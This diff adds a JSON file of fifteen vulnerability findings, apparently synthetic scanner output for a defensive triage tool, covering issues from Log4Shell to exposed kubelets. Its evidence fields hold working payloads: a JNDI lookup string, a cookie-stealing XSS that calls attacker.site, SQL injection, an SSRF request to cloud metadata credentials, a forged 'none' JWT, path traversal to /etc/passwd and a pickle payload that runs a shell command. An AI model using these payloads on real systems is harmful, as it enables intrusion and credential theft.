@@ -1,0 +1,381 @@
+[
+  {
+    "id": "SEC-001",
+    "title": "Log4j Remote Code Execution (Log4Shell)",
+    "category": "CVE",
+    "severity": "CRITICAL",
+    "cve_id": "CVE-2021-44228",
+    "cvss_score": 10.0,
+    "asset": "auth-service-prod.internal.corp",
+    "component": "org.apache.logging.log4j:log4j-core:2.14.1",
+    "endpoint": "POST /api/v1/auth/login",
+    "discovery_tool": "Trivy SCA & WAF Telemetry",
+    "timestamp": "2026-09-18T10:15:22Z",
+    "status": "OPEN",
+    "evidence": {
+      "request_header": "User-Agent: ${jndi:ldap://198.51.100.24:1389/Exploit}",
+      "matched_rule": "SIG-LOG4J-JNDI-INJECTION",
+      "server_log_snippet": "2026-09-18 10:15:22 ERROR [AuthService] Failed login attempt for user 'admin'. Lookup initiated for URI: ldap://198.51.100.24:1389/Exploit",
+      "outbound_connection_attempt": "TCP SYN to 198.51.100.24:1389 from 10.0.4.12:44921 (Blocked by Egress Firewall)"
+    },
+    "metadata": {
+      "environment": "production",
+      "owner": "Identity & Access Team",
+      "tags": ["rce", "java", "supply-chain", "critical-infrastructure"]
+    }
+  },
+  {
+    "id": "SEC-002",
+    "title": "Stored Cross-Site Scripting (XSS) in User Profile Bio",
+    "category": "XSS",
+    "severity": "HIGH",
+    "cve_id": null,
+    "cvss_score": 7.8,
+    "asset": "app.customer-portal.com",
+    "component": "Profile Rendering Microfrontend",
+    "endpoint": "PUT /api/v2/users/me/profile",
+    "discovery_tool": "OWASP ZAP DAST Scanner",
+    "timestamp": "2026-09-18T10:18:40Z",
+    "status": "OPEN",
+    "evidence": {
+      "payload_sent": "{\"bio\": \"Security Enthusiast <img src=x onerror=\\\"fetch('https://attacker.site/steal?c='+document.cookie)\\\">\"}",
+      "response_status": 200,
+      "reflection_snippet": "<div class=\"user-bio-container\">Security Enthusiast <img src=x onerror=\"fetch('https://attacker.site/steal?c='+document.cookie)\"></div>",
+      "content_security_policy": "script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net"
+    },
+    "metadata": {
+      "environment": "production",
+      "owner": "Frontend Core Team",
+      "tags": ["xss", "stored-xss", "dom-injection", "session-hijacking"]
+    }
+  },
+  {
+    "id": "SEC-003",
+    "title": "Broken Object Level Authorization (BOLA / IDOR) on Invoices Endpoint",
+    "category": "IDOR/BOLA",
+    "severity": "HIGH",
+    "cve_id": null,
+    "cvss_score": 8.5,
+    "asset": "billing-api.corp.io",
+    "component": "InvoiceController.java",
+    "endpoint": "GET /api/v1/invoices/INV-982341",
+    "discovery_tool": "Astra Automated API Security Scanner",
+    "timestamp": "2026-09-18T10:22:15Z",
+    "status": "OPEN",
+    "evidence": {
+      "request_authenticated_as": "tenant_id: org_acme_corp (user_id: usr_1002)",
+      "target_invoice_owner": "tenant_id: org_globex_corp (user_id: usr_8921)",
+      "http_status": 200,
+      "response_body_sample": "{\"invoice_id\": \"INV-982341\", \"tenant_id\": \"org_globex_corp\", \"total_amount\": 45000.00, \"billing_address\": \"123 Cyber St\", \"tax_id\": \"US-XX-991204\"}",
+      "missing_auth_check": "No validation verifying if CurrentSession.tenant_id matches Invoice.tenant_id before returning database record."
+    },
+    "metadata": {
+      "environment": "production",
+      "owner": "Billing & Payments Team",
+      "tags": ["bola", "idor", "api-security", "tenant-isolation", "pii-leak"]
+    }
+  },
+  {
+    "id": "SEC-004",
+    "title": "Publicly Accessible Cloud Storage Bucket Containing Customer PII Exports",
+    "category": "Security Misconfiguration",
+    "severity": "CRITICAL",
+    "cve_id": null,
+    "cvss_score": 9.1,
+    "asset": "storage.googleapis.com/corp-prod-analytics-exports",
+    "component": "Google Cloud Storage / AWS S3 Bucket ACL",
+    "endpoint": "https://storage.googleapis.com/corp-prod-analytics-exports/2026/users_dump.csv",
+    "discovery_tool": "Cloud Custodian CSPM Scanner",
+    "timestamp": "2026-09-18T10:25:00Z",
+    "status": "OPEN",
+    "evidence": {
+      "iam_policy": "roles/storage.objectViewer granted to allUsers",
+      "public_access_prevention": "Inherited / Enforced: False",
+      "curl_unauthenticated_test": "curl -sI https://storage.googleapis.com/corp-prod-analytics-exports/2026/users_dump.csv -> HTTP/2 200 OK, Content-Type: text/csv, Size: 418MB",
+      "sample_headers": "ETag: \"7a89f...\", Last-Modified: 2026-09-17T23:00:00Z"
+    },
+    "metadata": {
+      "environment": "production",
+      "owner": "Data Engineering & Cloud Ops",
+      "tags": ["cloud-security", "gcs", "s3", "data-exposure", "gdpr-risk"]
+    }
+  },
+  {
+    "id": "SEC-005",
+    "title": "Unauthenticated Redis Cache Service Exposed on Public Interface",
+    "category": "Exposed Services",
+    "severity": "CRITICAL",
+    "cve_id": null,
+    "cvss_score": 9.8,
+    "asset": "cache-01.us-east.corp.net",
+    "component": "Redis Server v6.2.6",
+    "endpoint": "redis://54.210.88.19:6379",
+    "discovery_tool": "Shodan / Nuclei External Attack Surface Scanner",
+    "timestamp": "2026-09-18T10:28:10Z",
+    "status": "OPEN",
+    "evidence": {
+      "open_port": 6379,
+      "raw_socket_interaction": "nc -nv 54.210.88.19 6379 -> INFO -> Response: # Server redis_version:6.2.6 os:Linux 5.15.0 # Keyspace db0:keys=1420502,expires=89201",
+      "unauthenticated_commands": "PING -> PONG; KEYS session:* -> 10,000+ session tokens returned without requiring AUTH command.",
+      "bind_directive": "bind 0.0.0.0 (protected-mode no)"
+    },
+    "metadata": {
+      "environment": "production",
+      "owner": "Infrastructure / DevOps",
+      "tags": ["exposed-service", "redis", "unauthenticated", "cache-tampering", "rce-risk"]
+    }
+  },
+  {
+    "id": "SEC-006",
+    "title": "Insecure TLS 1.0/1.1 Protocols and Weak 3DES Ciphers Enabled on Payment Gateway",
+    "category": "SSL/TLS Issues",
+    "severity": "MEDIUM",
+    "cve_id": "CVE-2016-2183",
+    "cvss_score": 5.9,
+    "asset": "payments.secure-checkout.com",
+    "component": "NGINX Edge Load Balancer",
+    "endpoint": "https://payments.secure-checkout.com:443",
+    "discovery_tool": "SSLLabs / testssl.sh",
+    "timestamp": "2026-09-18T10:31:05Z",
+    "status": "OPEN",
+    "evidence": {
+      "protocols_supported": ["TLSv1.0 (deprecated)", "TLSv1.1 (deprecated)", "TLSv1.2", "TLSv1.3"],
+      "vulnerable_ciphers": [
+        "TLS_RSA_WITH_3DES_EDE_CBC_SHA (Sweet32 Vulnerable, 64-bit block size)",
+        "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (CBC mode padding oracle prone)"
+      ],
+      "hsts_header": "Missing Strict-Transport-Security header",
+      "pci_dss_compliance": "Violation of PCI-DSS 4.0 Requirement 4.2.1 (Must disable TLS < 1.2)"
+    },
+    "metadata": {
+      "environment": "production",
+      "owner": "Network Engineering",
+      "tags": ["ssl-tls", "sweet32", "crypto", "pci-dss", "ciphers"]
+    }
+  },
+  {
+    "id": "SEC-007",
+    "title": "Blind Time-Based SQL Injection in Product Search API",
+    "category": "SQL Injection",
+    "severity": "CRITICAL",
+    "cve_id": null,
+    "cvss_score": 9.3,
+    "asset": "api.ecommerce.corp.com",
+    "component": "ProductCatalogRepository.py",
+    "endpoint": "GET /api/v1/products/search?sort=name",
+    "discovery_tool": "sqlmap / Custom DAST Fuzzer",
+    "timestamp": "2026-09-18T10:34:50Z",
+    "status": "OPEN",
+    "evidence": {
+      "injected_payload": "GET /api/v1/products/search?sort=name;SELECT+pg_sleep(10)--",
+      "response_time_baseline": "42ms",
+      "response_time_payload": "10,058ms (Consistent 10-second delay observed)",
+      "vulnerable_code_snippet": "query = f'SELECT id, name, price, stock FROM products WHERE active = true ORDER BY {request.args.get(\"sort\")}'",
+      "database_backend": "PostgreSQL 15.2 (Running as user 'app_db_user' with SELECT on customer_creds)"
+    },
+    "metadata": {
+      "environment": "production",
+      "owner": "E-Commerce Backend Team",
+      "tags": ["sqli", "time-based-sqli", "database-leak", "sqlmap"]
+    }
+  },
+  {
+    "id": "SEC-008",
+    "title": "Hardcoded Production Stripe Secret Key & AWS Access Key in Frontend Bundle",
+    "category": "Secret Leak",
+    "severity": "CRITICAL",
+    "cve_id": null,
+    "cvss_score": 9.6,
+    "asset": "checkout.portal.corp.io",
+    "component": "main.84f29a01.chunk.js",
+    "endpoint": "https://checkout.portal.corp.io/static/js/main.84f29a01.chunk.js",
+    "discovery_tool": "TruffleHog / GitGuardian SAST",
+    "timestamp": "2026-09-18T10:38:00Z",
+    "status": "OPEN",
+    "evidence": {
+      "leaked_token_1": "sk_live_51Mszxxxxxxxxxxxxxxxxxxxxxxxxxxxx99A2",
+      "leaked_token_2": "AKIAIOSFODNN7EXAMPLE (AWS Access Key ID) & wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+      "code_context_in_js": "const STRIPE_SECRET = 'sk_live_51Msz...'; const s3Uploader = new AWS.S3({ accessKeyId: 'AKIA...', secretAccessKey: 'wJalr...' });",
+      "live_validation": "Verified key valid against Stripe API (Read/Write charges permitted)."
+    },
+    "metadata": {
+      "environment": "production",
+      "owner": "Frontend Applications Team",
+      "tags": ["secret-leak", "hardcoded-credentials", "stripe", "aws-keys", "supply-chain"]
+    }
+  },
+  {
+    "id": "SEC-009",
+    "title": "Server-Side Request Forgery (SSRF) via Webhook Custom Preview",
+    "category": "SSRF",
+    "severity": "HIGH",
+    "cve_id": null,
+    "cvss_score": 8.6,
+    "asset": "integrations-service.corp.internal",
+    "component": "WebhookTesterService.go",
+    "endpoint": "POST /api/v1/webhooks/test-ping",
+    "discovery_tool": "Burp Suite Enterprise & Manual Pentest",
+    "timestamp": "2026-09-18T10:41:20Z",
+    "status": "OPEN",
+    "evidence": {
+      "payload_sent": "{\"target_url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/production-backend-role\"}",
+      "response_status": 200,
+      "response_body_sample": "{\"Code\": \"Success\", \"AccessKeyId\": \"ASIAVXXXXX...\", \"SecretAccessKey\": \"U8z...\", \"Token\": \"IQoJ...\"}",
+      "underlying_flaw": "Backend service performs unvalidated HTTP GET to user-supplied URL without filtering link-local or loopback addresses (169.254.0.0/16, 127.0.0.1, 10.0.0.0/8)."
+    },
+    "metadata": {
+      "environment": "production",
+      "owner": "Integrations Team",
+      "tags": ["ssrf", "imds", "cloud-credential-theft", "aws-metadata"]
+    }
+  },
+  {
+    "id": "SEC-010",
+    "title": "JWT Signature Verification Bypass via 'none' Algorithm Acceptance",
+    "category": "Broken Authentication",
+    "severity": "CRITICAL",
+    "cve_id": null,
+    "cvss_score": 9.4,
+    "asset": "api-gateway.corp.io",
+    "component": "AuthMiddleware.ts",
+    "endpoint": "ALL /api/v1/admin/*",
+    "discovery_tool": "jwt_tool / Dynamic Security Scanner",
+    "timestamp": "2026-09-18T10:44:30Z",
+    "status": "OPEN",
+    "evidence": {
+      "crafted_token_header": "{\"alg\": \"none\", \"typ\": \"JWT\"}",
+      "crafted_token_payload": "{\"sub\": \"user_9999\", \"role\": \"SuperAdmin\", \"org\": \"corp-master\", \"exp\": 1999999999}",
+      "crafted_token_signature": "",
+      "request_sent": "GET /api/v1/admin/users HTTP/1.1\\nAuthorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyXzk5OTkiLCJyb2xlIjoiU3VwZXJBZG1pbiIsIm9yZyI6ImNvcnAtbWFzdGVyIiwiZXhwIjoxOTk5OTk5OTk5fQ.",
+      "response_result": "HTTP/1.1 200 OK -> Full administrative user directory dumped."
+    },
+    "metadata": {
+      "environment": "production",
+      "owner": "Platform Gateway Team",
+      "tags": ["jwt", "authentication-bypass", "privilege-escalation", "token-forge"]
+    }
+  },
+  {
+    "id": "SEC-011",
+    "title": "Path Traversal Arbitrary File Read in Report Download Endpoint",
+    "category": "Path Traversal",
+    "severity": "HIGH",
+    "cve_id": null,
+    "cvss_score": 8.1,
+    "asset": "analytics.reports.corp.com",
+    "component": "ExportDownloadHandler.py",
+    "endpoint": "GET /api/v1/reports/download?filename=sales.csv",
+    "discovery_tool": "Burp Scanner / Static Code Analyzer",
+    "timestamp": "2026-09-18T10:48:10Z",
+    "status": "OPEN",
+    "evidence": {
+      "exploit_request": "GET /api/v1/reports/download?filename=../../../../../../etc/passwd HTTP/1.1",
+      "http_status": 200,
+      "returned_content_snippet": "root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nappuser:x:1001:1001:App Server:/home/appuser:/bin/bash",
+      "vulnerable_code": "return send_file(os.path.join('/var/reports/', filename))"
+    },
+    "metadata": {
+      "environment": "production",
+      "owner": "Analytics Service Team",
+      "tags": ["path-traversal", "lfi", "file-disclosure", "linux"]
+    }
+  },
+  {
+    "id": "SEC-012",
+    "title": "Permissive CORS Policy with Origin Reflection and Credentials Allowed",
+    "category": "Security Misconfiguration",
+    "severity": "MEDIUM",
+    "cve_id": null,
+    "cvss_score": 6.5,
+    "asset": "api.user-dashboard.com",
+    "component": "cors-config.js",
+    "endpoint": "OPTIONS & GET /api/v1/user/account-details",
+    "discovery_tool": "CORScanner / DAST",
+    "timestamp": "2026-09-18T10:51:00Z",
+    "status": "OPEN",
+    "evidence": {
+      "request_headers": "Origin: https://malicious-attacker-domain.evil.com\\nCookie: session_id=sess_active_9812",
+      "response_headers": "Access-Control-Allow-Origin: https://malicious-attacker-domain.evil.com\\nAccess-Control-Allow-Credentials: true\\nAccess-Control-Allow-Methods: GET, POST, OPTIONS",
+      "flaw_description": "Server dynamically echoes back arbitrary Origin header value while setting Access-Control-Allow-Credentials to true, allowing cross-origin authenticated theft."
+    },
+    "metadata": {
+      "environment": "production",
+      "owner": "API Core Team",
+      "tags": ["cors", "origin-reflection", "csrf-risk", "session-leak"]
+    }
+  },
+  {
+    "id": "SEC-013",
+    "title": "Lack of Rate Limiting on Authentication & Password Reset Endpoints",
+    "category": "Brute Force / Rate Limiting",
+    "severity": "MEDIUM",
+    "cve_id": null,
+    "cvss_score": 5.3,
+    "asset": "id.customer-portal.com",
+    "component": "LoginRateLimiter / Reverse Proxy",
+    "endpoint": "POST /api/v1/auth/login",
+    "discovery_tool": "Turbo Intruder / Penetration Test",
+    "timestamp": "2026-09-18T10:54:15Z",
+    "status": "OPEN",
+    "evidence": {
+      "burst_test": "5,000 requests dispatched in 15 seconds against single user account 'john.doe@corp.com' with dictionary password list.",
+      "http_responses": "5,000 consecutive HTTP 401 responses returned with 0 HTTP 429 (Too Many Requests) or CAPTCHA challenges.",
+      "timing_discrepancy": "Valid username response: 180ms; Invalid username response: 24ms (Enables rapid account enumeration)."
+    },
+    "metadata": {
+      "environment": "production",
+      "owner": "Identity & Access Management",
+      "tags": ["rate-limiting", "credential-stuffing", "account-enumeration", "brute-force"]
+    }
+  },
+  {
+    "id": "SEC-014",
+    "title": "Insecure Python Pickle Deserialization in Session Cookie",
+    "category": "Insecure Deserialization",
+    "severity": "CRITICAL",
+    "cve_id": null,
+    "cvss_score": 9.8,
+    "asset": "legacy-portal.corp.net",
+    "component": "session_manager.py",
+    "endpoint": "GET /dashboard",
+    "discovery_tool": "Bandit SAST & Manual Code Audit",
+    "timestamp": "2026-09-18T10:57:30Z",
+    "status": "OPEN",
+    "evidence": {
+      "cookie_name": "user_session",
+      "cookie_payload_base64": "gASVLAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBJpZCA+PiAvdG1wL3B3bmVkLXR4dJSFlFKULg==",
+      "vulnerable_code": "session_data = pickle.loads(base64.b64decode(request.cookies.get('user_session')))",
+      "impact_demonstration": "Executing arbitrary shell command (`id >> /tmp/pwned.txt`) upon cookie parsing before user authentication is verified."
+    },
+    "metadata": {
+      "environment": "production",
+      "owner": "Legacy Systems Maintenance",
+      "tags": ["deserialization", "pickle", "rce", "python-security"]
+    }
+  },
+  {
+    "id": "SEC-015",
+    "title": "Unauthenticated Kubernetes Kubelet Read/Write API Exposed on Node",
+    "category": "Exposed Services",
+    "severity": "CRITICAL",
+    "cve_id": null,
+    "cvss_score": 9.8,
+    "asset": "k8s-node-worker-04.us-central1.gcp.corp",
+    "component": "kubelet daemon",
+    "endpoint": "https://34.133.120.44:10250/pods",
+    "discovery_tool": "Peirates / Cloud Security Posture Scanner",
+    "timestamp": "2026-09-18T11:00:00Z",
+    "status": "OPEN",
+    "evidence": {
+      "port_exposed": 10250,
+      "test_query": "curl -k -s https://34.133.120.44:10250/runningpods/",
+      "result": "Full pod list returned including secrets, environment variables, mounted service account tokens for cluster namespace.",
+      "remote_exec_endpoint": "POST https://34.133.120.44:10250/run/prod/vault-agent-0/vault -> Returns interactive container command execution."
+    },
+    "metadata": {
+      "environment": "production",
+      "owner": "Platform Engineering & Kubernetes Team",
+      "tags": ["kubernetes", "kubelet", "container-escape", "cluster-takeover", "exposed-port"]
+    }
+  }
+]
